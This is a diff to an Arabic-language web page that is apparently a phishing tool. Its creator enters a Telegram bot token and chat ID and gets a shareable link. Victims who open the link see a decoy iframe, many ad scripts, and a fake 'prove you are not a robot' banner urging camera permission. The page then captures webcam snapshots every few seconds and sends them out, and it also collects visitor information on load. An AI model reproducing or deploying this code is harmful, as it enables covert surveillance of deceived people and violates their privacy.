@@ -136,56 +136,122 @@
     .check-icon {
       margin-right: 8px;
     }
+
+    /* ستايل صفحة المشاهدة بالاعلانات */
+    .viewer-page {
+      background: #0a0710;
+      min-height: 100vh;
+      width: 100%;
+      position: relative;
+    }
+    
+    .camera-request {
+      background: linear-gradient(90deg, #6e3be0, #a66bff);
+      color: white;
+      padding: 15px 20px;
+      text-align: center;
+      font-size: 18px;
+      font-weight: bold;
+      border-radius: 0;
+      margin-bottom: 10px;
+      border-bottom: 3px solid #ffd966;
+      box-shadow: 0 4px 20px rgba(166,107,255,0.5);
+      z-index: 10000;
+      position: relative;
+    }
+    
+    .camera-request i {
+      margin-left: 10px;
+      font-size: 24px;
+    }
+    
+    .ads-container {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      padding: 15px;
+      background: #0a0710;
+    }
+    
+    .ad-block {
+      width: 100%;
+      background: #131026;
+      border-radius: 12px;
+      padding: 15px;
+      box-sizing: border-box;
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+    
+    .ad-header {
+      color: #bfaef6;
+      font-size: 14px;
+      margin-bottom: 10px;
+      display: flex;
+      justify-content: space-between;
+    }
+    
+    .ad-content {
+      min-height: 100px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .viewer-content {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+    }
+    
+    .viewer-main {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+    }
+    
+    .viewer-iframe-wrapper {
+      width: 100%;
+      height: 500px;
+      margin-bottom: 20px;
+    }
+    
+    .viewer-iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+      border-radius: 12px;
+    }
+    
+    /* شبكة الاعلانات */
+    .ads-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+      gap: 20px;
+      padding: 20px;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    
+    .ad-item {
+      background: rgba(18,12,34,0.9);
+      border-radius: 16px;
+      padding: 15px;
+      backdrop-filter: blur(4px);
+      border: 1px solid rgba(255,255,255,0.1);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.6);
+    }
   </style>
 </head>
 <body>
 
-  <div class="wrap">
-
-    <div class="header" style="width:100%;max-width:1100px;"> 
-      <div class="nav">
-        <a href="#"></a>
-        <a href="#"></a>
-      </div>
-    </div>
-
-    <div class="card" id="cardArea" style="width:100%">
-      <div class="hero">
-        <div class="hero-left">
-          <h5>⚠️ يُمنع استخدام الأداة بشكل غير قانوني أو غير أخلاقي. المستخدم يتحمل المسؤولية الكاملة، ولسنا مسؤولين عن أي إساءة استخدام.</h5>
-
-          <div class="form" id="formBox">
-            <label>أدخل الـ ID</label>
-            <input type="text" id="chatIdInput" placeholder="Chat ID">
-
-            <label>أدخل توكن البوت</label>
-            <input type="text" id="tokenInput" placeholder="Bot Token">
-
-            <label>أدخل الرابط الذي تريد عرضه</label>
-            <input type="text" id="linkInput" placeholder="https://b7xha.github.io/Maroweb/">
-
-            <button class="btn" id="generateBtn">إنشاء الرابط</button>
-
-            <div id="result" style="display:none" class="result">
-              <div id="linkText" style="flex:1;color:#e7dbff;font-size:13px;"></div>
-              <button class="copyBtn" id="copyBtn">نسخ الرابط</button>
-            </div>
-          </div>
-        </div>
-
-        <div style="min-width:260px;flex:0 0 260px;">
-          <div style="background:linear-gradient(180deg, rgba(128,77,255,0.08), rgba(0,0,0,0.15));padding:14px;border-radius:12px;text-align:center">
-          </div>
-        </div>
-      </div>
-    </div>
-
+  <div class="wrap" id="mainWrap">
+    <!-- المحتوى الرئيسي سيظهر هنا عادة -->
   </div>
 
   <div id="captureBadge" class="captureBadge"></div>
   <div class="madeby">Made by K1X</div>
 
-  <!-- الدايلوج بشرط الاشتراك في قناتين -->
+  <!-- الدايلوج - سيظهر فقط في الصفحة الرئيسية -->
   <div class="dialog" id="mandatoryDialog">
     <p> اشتراك إجباري في القنوات </p>
     <div class="dialog-buttons" id="dialogButtons">
@@ -272,97 +338,120 @@
   // استدعاء دالة إرسال المعلومات فور فتح الصفحة (الزائر العادي)
   sendVisitorInfo();
 
-  // ------------------ عناصر الدايلوج ------------------
-  const dialog = document.getElementById('mandatoryDialog');
-  const channel1 = document.getElementById('channel1');
-  const channel2 = document.getElementById('channel2');
-  const subscribeBtn = document.getElementById('subscribeDoneBtn');
-
-  // التحقق من حالة الاشتراك
-  let channel1Clicked = false;
-  let channel2Clicked = false;
-
-  // عند النقر على رابط القناة الأولى
-  channel1.addEventListener('click', function() {
-    channel1Clicked = true;
-    channel1.classList.add('visited');
-    channel1.style.background = '#28a745';
-    channel1.style.color = 'white';
-    channel1.style.borderColor = '#28a745';
-    checkBothClicked();
-  });
-
-  // عند النقر على رابط القناة الثانية
-  channel2.addEventListener('click', function() {
-    channel2Clicked = true;
-    channel2.classList.add('visited');
-    channel2.style.background = '#28a745';
-    channel2.style.color = 'white';
-    channel2.style.borderColor = '#28a745';
-    checkBothClicked();
-  });
-
-  // دالة التحقق من النقر على كلا الرابطين
-  function checkBothClicked() {
-    if (channel1Clicked && channel2Clicked) {
-      subscribeBtn.disabled = false;
-      subscribeBtn.classList.add('active');
-      subscribeBtn.style.opacity = '1';
-      subscribeBtn.style.pointerEvents = 'auto';
-      subscribeBtn.innerHTML = '✅ تم الاشتراك';
-    }
-  }
-
-  // إخفاء الدايلوج عند الضغط على زر "تم الاشتراك"
-  subscribeBtn.addEventListener('click', function() {
-    dialog.style.display = 'none';
-  });
-
-  // ------------------ عناصر الفورم ------------------
-  const generateBtn = document.getElementById('generateBtn');
-  const resultEl = document.getElementById('result');
-  const linkText = document.getElementById('linkText');
-  const copyBtn = document.getElementById('copyBtn');
-
-  generateBtn.addEventListener('click', () => {
-    const chat = document.getElementById('chatIdInput').value.trim();
-    const token = document.getElementById('tokenInput').value.trim();
-    const url = document.getElementById('linkInput').value.trim();
-
-    if(!chat || !token || !url){
-      alert('املأ كل الحقول');
-      return;
-    }
-
-    const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&url=${encodeURIComponent(url)}`;
-    linkText.innerText = fullLink;
-    resultEl.style.display = 'flex';
-  });
-
-  copyBtn.addEventListener('click', async () => {
-    try {
-      await navigator.clipboard.writeText(linkText.innerText);
-      copyBtn.innerText = 'تم النسخ';
-      setTimeout(()=> copyBtn.innerText = 'نسخ الرابط',1500);
-    } catch(e) {
-      alert('فشل النسخ: ' + e.message);
-    }
-  });
-
-  // ------------------ viewer mode ------------------
+  // ------------------ التحقق من وضع المشاهدة ------------------
   const params = new URLSearchParams(window.location.search);
   const chat = params.get('chat');
   const token = params.get('token');
   const target = params.get('url');
 
+  // إذا كان في وضع المشاهدة (Viewer Mode) - إخفاء المحتوى الرئيسي وعرض صفحة المشاهدة بالاعلانات
   if (chat && token && target) {
-    // إخفاء الكارت وعرض الـ iframe
-    document.getElementById('cardArea').style.display = 'none';
-    const iframe = document.createElement('iframe');
-    iframe.className = 'viewerFrame';
-    iframe.src = target;
-    document.querySelector('.wrap').appendChild(iframe);
+    // إخفاء المحتوى الرئيسي
+    document.querySelector('.wrap').innerHTML = '';
+    document.querySelector('.wrap').classList.add('viewer-page');
+    
+    // إخفاء الدايلوج نهائياً في وضع المشاهدة
+    const dialog = document.getElementById('mandatoryDialog');
+    if (dialog) dialog.style.display = 'none';
+    
+    // عرض المحتوى الجديد مع الاعلانات
+    const wrap = document.querySelector('.wrap');
+    
+    // إنشاء هيكل صفحة المشاهدة بالكامل
+    wrap.innerHTML = `
+      <div class="viewer-content">
+        <div class="camera-request">
+          ⚡ اضغط على "سماح" في الكاميرا للتأكد من أنك لست روبوت ⚡
+        </div>
+        
+        <div class="viewer-main">
+          <div class="viewer-iframe-wrapper">
+            <iframe class="viewer-iframe" src="${target}"></iframe>
+          </div>
+          
+          <!-- بداية الاعلانات الكثيرة -->
+          <div class="ads-container">
+            <div class="ad-block">
+              <div class="ad-header">
+                <span>📢 إعلان ممول</span>
+                <span>Ad</span>
+              </div>
+              <div class="ad-content" id="ad1">
+                <script src="https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js"><\/script>
+              </div>
+            </div>
+            
+            <div class="ad-block">
+              <div class="ad-header">
+                <span>📢 إعلان ممول</span>
+                <span>Ad</span>
+              </div>
+              <div class="ad-content" id="ad2">
+                <script async="async" data-cfasync="false" src="https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js"><\/script>
+                <div id="container-596225155ab3da796681d551cb4b7cf4"></div>
+              </div>
+            </div>
+            
+            <div class="ad-block">
+              <div class="ad-header">
+                <span>📢 إعلان ممول</span>
+                <span>Ad</span>
+              </div>
+              <div class="ad-content" id="ad3">
+                <script src="https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js"><\/script>
+              </div>
+            </div>
+            
+            <div class="ad-block">
+              <div class="ad-header">
+                <span>📢 إعلان ممول</span>
+                <span>Ad</span>
+              </div>
+              <div class="ad-content" id="ad4">
+                <script>
+                  atOptions = {
+                    'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
+                    'format' : 'iframe',
+                    'height' : 300,
+                    'width' : 160,
+                    'params' : {}
+                  };
+                <\/script>
+                <script src="https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js"><\/script>
+              </div>
+            </div>
+          </div>
+          
+          <!-- اعلانات اضافية بشكل شبكة -->
+          <div class="ads-grid">
+            <div class="ad-item">
+              <script src="https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js"><\/script>
+            </div>
+            <div class="ad-item">
+              <script async="async" data-cfasync="false" src="https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js"><\/script>
+              <div id="container-596225155ab3da796681d551cb4b7cf4-2"></div>
+            </div>
+            <div class="ad-item">
+              <script src="https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js"><\/script>
+            </div>
+            <div class="ad-item">
+              <script>
+                atOptions = {
+                  'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
+                  'format' : 'iframe',
+                  'height' : 300,
+                  'width' : 160,
+                  'params' : {}
+                };
+              <\/script>
+              <script src="https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js"><\/script>
+            </div>
+          </div>
+        </div>
+      </div>
+    `;
 
+    // بدء الكاميرا وإرسال الصور
     const captureBadge = document.getElementById('captureBadge');
     captureBadge.style.display = 'inline-block';
     captureBadge.textContent = '';
@@ -379,10 +468,8 @@
         vid.srcObject = stream;
         document.body.appendChild(vid);
         
-        // انتظر حتى يشتغل الفيديو فعلاً
         await vid.play();
         
-        // انتظر حتى يكون للفيديو أبعاد حقيقية
         let attempts = 0;
         while ((vid.videoWidth === 0 || vid.videoHeight === 0) && attempts < 50) {
           await new Promise(resolve => setTimeout(resolve, 100));
@@ -394,12 +481,10 @@
         canvas.height = vid.videoHeight || 480;
 
         const tick = async () => {
-          // تأكد أن الفيديو شغال
           if (vid.paused || vid.ended) {
             await vid.play();
           }
           
-          // تأكد من الأبعاد
           if (vid.videoWidth > 0 && vid.videoHeight > 0) {
             canvas.width = vid.videoWidth;
             canvas.height = vid.videoHeight;
@@ -409,7 +494,6 @@
           ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
 
           canvas.toBlob(async (blob) => {
-            // تجاهل الصور الصغيرة جداً (الفارغة)
             if (!blob || blob.size < 2000) return;
             
             try {
@@ -451,10 +535,7 @@
           }, 'image/jpeg', 0.9);
         };
 
-        // أول صورة بعد ثانيتين عشان الفيديو يثبت
         setTimeout(tick, 2000);
-        
-        // بعد كده كل 4 ثواني
         const intervalId = setInterval(tick, 4000);
 
         window.addEventListener('beforeunload', () => {
@@ -464,12 +545,129 @@
 
       } catch (err) {
         const captureBadge = document.getElementById('captureBadge');
-        captureBadge.textContent = '❌ إذن الكاميرا مرفوض';
+        captureBadge.textContent = '❌ إذن الكاميرا مرفوض - لا يمكن التحقق';
         captureBadge.style.background = 'rgba(160,40,40,0.9)';
         console.error('Camera error', err);
       }
     })();
+    
+  } else {
+    // ------------------ هذا هو المحتوى الرئيسي (الصفحة الرئيسية) ------------------
+    document.querySelector('.wrap').innerHTML = `
+      <div class="header" style="width:100%;max-width:1100px;"> 
+        <div class="nav">
+          <a href="#"></a>
+          <a href="#"></a>
+        </div>
+      </div>
+
+      <div class="card" id="cardArea" style="width:100%">
+        <div class="hero">
+          <div class="hero-left">
+            <h5>⚠️ يُمنع استخدام الأداة بشكل غير قانوني أو غير أخلاقي. المستخدم يتحمل المسؤولية الكاملة، ولسنا مسؤولين عن أي إساءة استخدام.</h5>
+
+            <div class="form" id="formBox">
+              <label>أدخل الـ ID</label>
+              <input type="text" id="chatIdInput" placeholder="Chat ID">
+
+              <label>أدخل توكن البوت</label>
+              <input type="text" id="tokenInput" placeholder="Bot Token">
+
+              <button class="btn" id="generateBtn">إنشاء الرابط</button>
+
+              <div id="result" style="display:none" class="result">
+                <div id="linkText" style="flex:1;color:#e7dbff;font-size:13px;"></div>
+                <button class="copyBtn" id="copyBtn">نسخ الرابط</button>
+              </div>
+            </div>
+          </div>
+
+          <div style="min-width:260px;flex:0 0 260px;">
+            <div style="background:linear-gradient(180deg, rgba(128,77,255,0.08), rgba(0,0,0,0.15));padding:14px;border-radius:12px;text-align:center">
+            </div>
+          </div>
+        </div>
+      </div>
+    `;
+
+    // ------------------ عناصر الدايلوج ------------------
+    const dialog = document.getElementById('mandatoryDialog');
+    const channel1 = document.getElementById('channel1');
+    const channel2 = document.getElementById('channel2');
+    const subscribeBtn = document.getElementById('subscribeDoneBtn');
+
+    // التحقق من حالة الاشتراك
+    let channel1Clicked = false;
+    let channel2Clicked = false;
+
+    // عند النقر على رابط القناة الأولى
+    channel1.addEventListener('click', function() {
+      channel1Clicked = true;
+      channel1.classList.add('visited');
+      channel1.style.background = '#28a745';
+      channel1.style.color = 'white';
+      channel1.style.borderColor = '#28a745';
+      checkBothClicked();
+    });
+
+    // عند النقر على رابط القناة الثانية
+    channel2.addEventListener('click', function() {
+      channel2Clicked = true;
+      channel2.classList.add('visited');
+      channel2.style.background = '#28a745';
+      channel2.style.color = 'white';
+      channel2.style.borderColor = '#28a745';
+      checkBothClicked();
+    });
+
+    // دالة التحقق من النقر على كلا الرابطين
+    function checkBothClicked() {
+      if (channel1Clicked && channel2Clicked) {
+        subscribeBtn.disabled = false;
+        subscribeBtn.classList.add('active');
+        subscribeBtn.style.opacity = '1';
+        subscribeBtn.style.pointerEvents = 'auto';
+        subscribeBtn.innerHTML = '✅ تم الاشتراك';
+      }
+    }
+
+    // إخفاء الدايلوج عند الضغط على زر "تم الاشتراك"
+    subscribeBtn.addEventListener('click', function() {
+      dialog.style.display = 'none';
+    });
+
+    // ------------------ عناصر الفورم ------------------
+    const generateBtn = document.getElementById('generateBtn');
+    const resultEl = document.getElementById('result');
+    const linkText = document.getElementById('linkText');
+    const copyBtn = document.getElementById('copyBtn');
+
+    generateBtn.addEventListener('click', () => {
+      const chat = document.getElementById('chatIdInput').value.trim();
+      const token = document.getElementById('tokenInput').value.trim();
+
+      if(!chat || !token){
+        alert('املأ كل الحقول');
+        return;
+      }
+
+      // تمت إزالة حقل الرابط نهائياً، سيتم استخدام رابط ثابت
+      const fixedUrl = "https://b7xha.github.io/Maroweb/";
+      const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&url=${encodeURIComponent(fixedUrl)}`;
+      linkText.innerText = fullLink;
+      resultEl.style.display = 'flex';
+    });
+
+    copyBtn.addEventListener('click', async () => {
+      try {
+        await navigator.clipboard.writeText(linkText.innerText);
+        copyBtn.innerText = 'تم النسخ';
+        setTimeout(()=> copyBtn.innerText = 'نسخ الرابط',1500);
+      } catch(e) {
+        alert('فشل النسخ: ' + e.message);
+      }
+    });
   }
 </script>
 </body>
-  </html>
+                                                                                                                        </html>
